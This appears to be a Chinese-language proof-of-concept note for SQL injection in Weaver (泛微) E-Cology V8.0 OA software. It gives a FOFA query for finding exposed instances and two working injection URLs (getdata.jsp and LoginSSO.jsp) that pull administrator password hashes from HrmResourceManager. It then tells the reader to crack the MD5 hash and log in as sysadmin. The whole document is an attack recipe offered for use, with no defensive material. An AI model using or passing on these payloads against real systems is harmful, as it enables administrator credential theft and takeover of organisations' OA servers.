# 泛微OA E-Cology V8.0 SQL注入漏洞
## 资产收集：
fofa：`app="泛微-协同办公OA"`
## POC
- getdata.jsp:`/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager`  
![](/img/E-Cology_sql.png)
- LoginSSO.jsp SQL:`/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManage`  
md5解密后登陆：`sysadmin/md5解密的密码`